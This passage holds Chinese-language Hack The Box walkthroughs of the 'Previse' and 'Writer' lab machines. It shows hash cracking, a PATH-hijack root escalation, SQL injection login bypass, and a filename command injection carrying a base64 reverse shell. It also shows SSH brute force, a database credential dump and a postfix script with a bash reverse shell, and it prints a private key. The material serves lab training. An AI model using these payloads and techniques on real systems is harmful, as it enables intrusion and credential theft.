  | 2021-08-08 13:23:42 |\n|  5 | bobby     | $1$🧂llol$SyqVySL69GZ.tBbiicFiT/   | 2021-08-08 14:02:50 |\n|  6 | lucifiel  | $1$🧂llol$K9wrU9maYCFrqr482bGkS/   | 2021-08-08 17:49:18 |\n|  7 | 0xrf1606  | $1$🧂llol$rObjMowMWOzqMlAz8ZsBc1   | 2021-08-08 18:02:45 |\n+----+-----------+------------------------------------+---------------------+\n```\n通过查看home目录，发现`m4lwhere`这个用户是我们需要的用户(其他用户都是其他正在做这台靶机的人创建的，基于HTB的规则，咱们不要影响到其他人)，咱们把它的hash拿去使用hashcat或者john破解 ### john\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nilovecody112235! (?)\n1g 0:00:20:20 DONE (2021-08-09 02:51) 0.000819g/s 6073p/s 6073c/s 6073C/s ilovecody31..ilovecody..\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n\n┌──(root💀root)-[~/Desktop]\n└─# john --show hash\n?:ilovecody112235!\n\n1 password hash cracked, 0 left\n\n```\n### hashcat\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# hashcat -a 0 -m 500 hash --wordlist /usr/share/wordlists/rockyou.txt -o 123                                                                                                                             255 ⨯\nhashcat (v6.1.1) starting...\n\nOpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n=============================================================================================================================\n* Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 2868/2932 MB (1024 MB allocatable), 2MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers applied:\n* Zero-Byte\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nUsing pure kernels enables cracking longer passwords but for the price of drastically reduced performance.\nIf you want to switch to optimized backend kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\nHost memory required for this attack: 64 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n┌──(root💀root)-[~/Desktop]\n└─# cat 123\n$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!\n```\n得到了账号密码\n\n```Plain Text\nusername = m4lwhere\npassword = ilovecody112235!\n```\n使用ssh进行登录\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# ssh m4lwhere@10.10.11.104\nm4lwhere@10.10.11.104's password:\nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun Aug  8 19:21:55 UTC 2021\n\n  System load:  0.4               Processes:           202\n  Usage of /:   49.2% of 4.85GB   Users logged in:     0\n  Memory usage: 20%               IP address for eth0: 10.10.11.104\n  Swap usage:   0%\n\n0 updates can be applied immediately.\n\nLast login: Fri Jun 18 01:09:10 2021 from 10.10.10.5\nm4lwhere@previse:~$ whoami&&id\nm4lwhere\nuid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)\n```\n```Plain Text\nm4lwhere@previse:~$ cat user.txt\n29e7b0a44a1b8cc46856e3b43ccdcfa4\n```\n成功获得user权限的flag ## 权限提升 使用sudo -l查看一下m4lwhere用户的sudo权限\n\n```Plain Text\nm4lwhere@previse:~$ sudo -l\n[sudo] password for m4lwhere:\nUser m4lwhere may run the following commands on previse:\n    (root) /opt/scripts/access_backup.sh\n```\n查看一下这个文件\n\n```Plain Text\nm4lwhere@previse:~$ cat /opt/scripts/access_backup.sh\n#!/bin/bash\n\n# We always make sure to store logs, we take security SERIOUSLY here\n\n# I know I shouldnt run this as root but I cant figure it out programmatically on my account\n# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time\n\ngzip -c /var/log/apache2/access.log > /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz\ngzip -c /var/www/file_access.log > /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gz\n```\n提权\n\n```Plain Text\ncd /tmp\ncat << EOF > gzip\n> #!/bin/bash\n> cp /bin/bash /tmp/c\n> chmod u+s /tmp/c\n> EOF\nchmod +x gzip\nexport PATH=$( pwd ):$PATH\n\nsudo /opt/scripts/access_backup.sh\n./c -p\n```\n```Plain Text\nc-4.4# whoami&&id\nroot\nuid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere)\n```\n成功提权到root权限\n\n```Plain Text\nc-4.4# cd /root\nc-4.4# ls\nroot.txt\nc-4.4# cat root.txt\n76a5854ac1f5d8cb5e1079cb1964dacf\n```\n成功拿到root权限的flag","tags":["Hackthebox"]},{"title":"Writer - Hackthebox","url":"/2021/08/06/Hackthebox/Medium/Hackthebox-Writer/","content":"\n# Hackthebox-Writer\n## 靶场信息\n![](Hackthebox-Writer/image1.png)\n\n## 靶场类型\n![](Hackthebox-Writer/image2.png)\n\n## 信息搜集\n使用nmap进行信息搜集\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV -p- 10.10.11.101\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 03:27 CST\nNmap scan report for 10.10.11.101\nHost is up (0.23s latency).\nNot shown: 65531 closed ports\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)\n|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)\n|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)\n80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Story Bank | Writer.HTB\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=8/5%OT=22%CT=1%CU=34682%PV=Y%DS=2%DC=T%G=Y%TM=610AEB60\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11\nOS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: 12m51s\n|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2021-08-04T19:45:33\n|_  start_date: N/A\n\nTRACEROUTE (using port 5900/tcp)\nHOP RTT       ADDRESS\n1   259.68 ms 10.10.14.1\n2   259.76 ms 10.10.11.101\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 298.54 seconds\n```\n咱们去80端口的HTTP服务看一下\n\n![](Hackthebox-Writer/image3.png)\n\n在人工查看以后，我发现并没有什么突破，咱们先做个目录fuzz吧\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 100 -u http://10.10.11.101/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.11.101/\n[+] Method:                  GET\n[+] Threads:                 100\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/08/05 04:22:00 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://10.10.11.101/about                (Status: 200) [Size: 3522]\nhttp://10.10.11.101/contact              (Status: 200) [Size: 4905]\nhttp://10.10.11.101/static               (Status: 301) [Size: 313] [--> http://10.10.11.101/static/]\nhttp://10.10.11.101/logout               (Status: 302) [Size: 208] [--> http://10.10.11.101/]\nhttp://10.10.11.101/dashboard            (Status: 302) [Size: 208] [--> http://10.10.11.101/]\nhttp://10.10.11.101/administrative       (Status: 200) [Size: 1443]\nhttp://10.10.11.101/server-status        (Status: 403) [Size: 277]\n\n===============================================================\n2021/08/05 04:32:00 Finished\n===============================================================\n```\n发现有一个\n\n```Plain Text\nadministratortive\n```\n目录，咱们进入查看一下\n\n![](Hackthebox-Writer/image4.png)\n\n是一个登录页面，我测试了一下弱口令，并不存在\n\n然后经过我大量的测试以后，发现这个登录页面存在Sql注入，且可用万能密码进行登录 ## 漏洞利用\n\n![](Hackthebox-Writer/image5.png)\n\n![](Hackthebox-Writer/image6.png)\n\n咱们对比一下这两个的区别，可以发现\n\n```Plain Text\nadmin'order by 6;--+\n```\n是执行成功了，提示咱们\n\n```Plain Text\nWelecome admin\n```\n，所以确定存在注入\n\n![](Hackthebox-Writer/image7.png)\n\n通过进行细致的手工注入后发现，该注入点第二项可被显示咱们利用这个点来进行利用\n\n![](Hackthebox-Writer/image8.png)\n\n经过大量的测试后，发现该注入点可用来读取文件\n\n```Plain Text\n/etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nkyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\npostfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin\nfilter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh\njohn:x:1001:1001:,,,:/home/john:/bin/bash\nmysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false\n```\n咱们去登录一下后台看一下，使用万能密码\n\n```Plain Text\nusername = admin';--+\npassword = password\n```\n登录成功\n\n![](Hackthebox-Writer/image9.png)\n\n我发现该后台有上传功能，不过只能上传图片\n\n不过没有关系，咱们制作一个图片马就可以了\n\n```Plain Text\nstep 1\necho -n '/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.110/9001 0>&1\"' | base64\n将反弹shell的语句转换为base64格式\n\nstep 2\n随便准备一张图片，我这里就用的1.jpg\n\nstep 3\ntouch '1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;'\n将图片和木马绑定在一起，生成一个图片马的格式(严格意义上说不是图片马，毕竟只是一个后缀绕过)\n\nstep 4\nfile:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;#\n上传的时候所使用的执行语句\n\nstep 5\nnc -nvlp 9001\n使用nc监听端口\n```\n上面是一个大致的利用步骤，咱们现在来详细进行利用\n\n首先前三步生成图片马就不说了，稍微修改一下指令然后输入即可\n\n在进入第四步之前，咱们需要先登入后台\n\n![](Hackthebox-Writer/image10.png)\n\n然后修改一篇文章\n\n![](Hackthebox-Writer/image11.png)\n\n修改过程中然后上传我们制作的木马\n\n![](Hackthebox-Writer/image12.png)\n\n然后我们使用burp进行抓包，然后再进行修改\n\n修改后以后，使用nc监听我们指定的端口，然后执行流量包即可\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nc -nvlp 9001\nlistening on [any] 9001 ...\nconnect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 48906\nbash: cannot set terminal process group (1061): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@writer:/$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功获得一个www-data权限的shell\n\n至于上面用到的图片的路径怎么得来的，咱们在之前爆破的时候获得了一个`/static`路径，进入后发现可以目录遍历\n\n```Plain Text\nhttp://10.10.11.101/static/img/\n```\n咱们在这个路径即可看到我们上传的文件，再利用sql注入处的文件读取读取配置文件，即可知道绝对路径\n\n暂时在这又卡壳了，查看一下home目录\n\n```Plain Text\nwww-data@writer:/home$ ls\nls\njohn  kyle\n```\n这里有两个思路\n\n1. 使用hydra爆破kyle的密码\n2. 读取mysql的配置，直接进数据库拿kyle的hash\n\n咱们先来看看第一个，hydra爆破密码\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-05 05:16:18\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 9437 login tries (l:1/p:9437), ~590 tries per task\n[DATA] attacking ssh://10.10.11.101:22/\n[STATUS] 121.00 tries/min, 121 tries in 00:01h, 9318 to do in 01:18h, 16 active\n[STATUS] 112.33 tries/min, 337 tries in 00:03h, 9102 to do in 01:22h, 16 active\n[STATUS] 99.71 tries/min, 698 tries in 00:07h, 8741 to do in 01:28h, 16 active\n[STATUS] 97.27 tries/min, 1459 tries in 00:15h, 7980 to do in 01:23h, 16 active\n[STATUS] 96.23 tries/min, 2983 tries in 00:31h, 6456 to do in 01:08h, 16 active\n[STATUS] 96.04 tries/min, 4514 tries in 00:47h, 4925 to do in 00:52h, 16 active\n[STATUS] 95.70 tries/min, 6029 tries in 01:03h, 3410 to do in 00:36h, 16 active\n[STATUS] 95.49 tries/min, 7544 tries in 01:19h, 1895 to do in 00:20h, 16 active\n[STATUS] 95.18 tries/min, 9042 tries in 01:35h, 397 to do in 00:05h, 16 active\n[22][ssh] host: 10.10.11.101   login: kyle   password: marcoantonio\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 2 final worker threads did not complete until end.\n[ERROR] 2 targets did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-05 06:55:10\n```\n然后是第二个，进入数据库拿kyle的hash\n\n```Plain Text\nwww-data@writer:/$ cd /etc/mysql\ncd /etc/mysql\nwww-data@writer:/etc/mysql$ ls\nls\nconf.d\ndebian-start\ndebian.cnf\nmariadb.cnf\nmariadb.conf.d\nmy.cnf\nmy.cnf.fallback\nwww-data@writer:/etc/mysql$ cat mariadb.cnf\ncat mariadb.cnf\n# The MariaDB configuration file\n#\n# The MariaDB/MySQL tools read configuration files in the following order:\n# 1. \"/etc/mysql/mariadb.cnf\" (this file) to set global defaults,\n# 2. \"/etc/mysql/conf.d/*.cnf\" to set global options.\n# 3. \"/etc/mysql/mariadb.conf.d/*.cnf\" to set MariaDB-only options.\n# 4. \"~/.my.cnf\" to set user-specific options.\n#\n# If the same option is defined multiple times, the last one will apply.\n#\n# One can use all long options that the program supports.\n# Run program with --help to get a list of available options and with\n# --print-defaults to see which it would actually understand and use.\n\n#\n# This group is read both both by the client and the server\n# use it for options that affect everything\n#\n[client-server]\n\n# Import all .cnf files from configuration directory\n!includedir /etc/mysql/conf.d/\n!includedir /etc/mysql/mariadb.conf.d/\n\n[client]\ndatabase = dev\nuser = djangouser\npassword = DjangoSuperPassword\ndefault-character-set = utf8\n```\n拿到mysql数据库账号密码，进入数据库拿kyle用户的hash值\n\n```Plain Text\nwww-data@writer:/etc/mysql$ mysql -u djangouser -h 127.0.0.1 -p\nmysql -u djangouser -h 127.0.0.1 -p\nEnter password: DjangoSuperPassword\n\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 1508\nServer version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [dev]> show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| dev                |\n| information_schema |\n+--------------------+\n2 rows in set (0.001 sec)\n\nMariaDB [dev]> use dev;\nuse dev;\nDatabase changed\nMariaDB [dev]> show tables;\nshow tables;\n+----------------------------+\n| Tables_in_dev              |\n+----------------------------+\n| auth_group                 |\n| auth_group_permissions     |\n| auth_permission            |\n| auth_user                  |\n| auth_user_groups           |\n| auth_user_user_permissions |\n| django_admin_log           |\n| django_content_type        |\n| django_migrations          |\n| django_session             |\n+----------------------------+\n10 rows in set (0.000 sec)\n\nMariaDB [dev]> SELECT * FROM auth_user;\nSELECT * FROM auth_user;\n+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+\n| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |\n+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+\n|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |\n+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+\n1 row in set (0.000 sec)\n```\n成功得到hash值\n\n```Plain Text\npbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=\n```\n然后保存到本地文件\n\n使用john或者hashcat进行爆破即可\n\n```Plain Text\nhashcat -a 0 -m 10000 hash --wordlist /usr/share/wordlists/rockyou.txt\n```\n成功得到用户kyle的账号密码\n\n```Plain Text\nusername = kyle\npassword = marcoantonio\n```\n咱们使用ssh进行登录\n\n```Plain Text\nkyle@writer:~$ cat user.txt\n70dc74ad2b72d9bf163b98822d6222a9\n```\n成功获得user权限的flag ## 权限提升 咱们准备两个脚本\n\n```Plain Text\n#!/bin/bash\n# Localize these.\nbash -i &>/dev/tcp/10.10.14.110/4444 0>&1\nINSPECT_DIR=/var/spool/filter\nSENDMAIL=/usr/sbin/sendmail\n\n# Get disclaimer addresses\nDISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses\n\n# Exit codes from <sysexits.h>\nEX_TEMPFAIL=75\nEX_UNAVAILABLE=69\n\n# Clean up when done or when aborting.\ntrap \"rm -f in.$$\" 0 1 2 3 15\n\n# Start processing.\ncd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit\n$EX_TEMPFAIL; }\n\ncat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }\n\n# obtain From address\nfrom_address=`grep -m 1 \"From:\" in.$$ | cut -d \"<\" -f 2 | cut -d \">\" -f 1`\n\nif [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then\n  /usr/bin/altermime --input=in.$$ \\\n                   --disclaimer=/etc/postfix/disclaimer.txt \\\n                   --disclaimer-html=/etc/postfix/disclaimer.txt \\\n                   --xheader=\"X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm\" || \\\n                    { echo Message content rejected; exit $EX_UNAVAILABLE; }\nfi\n\n$SENDMAIL \"$@\" <in.$$\n\nexit $?\n```\n这是修改原文件`/etc/postfix/disclaimer`后得到的脚本，这里只是举个例子，该靶机无法使用bash和sh进行反弹shell。可以使用python或socat进行getshell，由于懒，我就不修改了\n\n查看文件`/etc/postfix/disclaimer_addresses`得到邮箱`kyle@writer.htb`\n\n使用该邮箱编写脚本\n\n```Plain Text\nimport smtplib\nhost = '127.0.0.1'\nport = 25\n\nsender_email = \"kyle@writer.htb\"\nreceiver_email = \"kyle@writer.htb\"\nmessage = \"\"\"\\\nSubject: Hi there\n\nTest_python_sender.\"\"\"\n\ntry:\n    server = smtplib.SMTP(host, port)\n    server.ehlo()\n    server.sendmail(sender_email, receiver_email, message)\nexcept Exception as e:\n    print(e)\nfinally:\n    server.quit()\n```\n这是发送邮件的脚本\n\n上传到服务器\n\n然后使用nc监听端口\n\n```Plain Text\nnc -nvlp 4444\n```\n拷贝disclaimer文件并发送邮件\n\n```Plain Text\ncp disclaimer /etc/postfix/disclaimer && python3 sendmail.py\n```\n成功得到john的shell\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 44352\nbash: cannot set terminal process group (78664): Inappropriate ioctl for device\nbash: no job control in this shell\njohn@writer:/var/spool/postfix$ whoami&&id\nwhoami&&id\njohn\nuid=1001(john) gid=1001(john) groups=1001(john)\n```\n得到john的权限，在`/home/john/.ssh/`目录下拿到`id_rsa`文件，保存到本地\n\n```Plain Text\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\nVikbn3mEwRCjFa5XcRP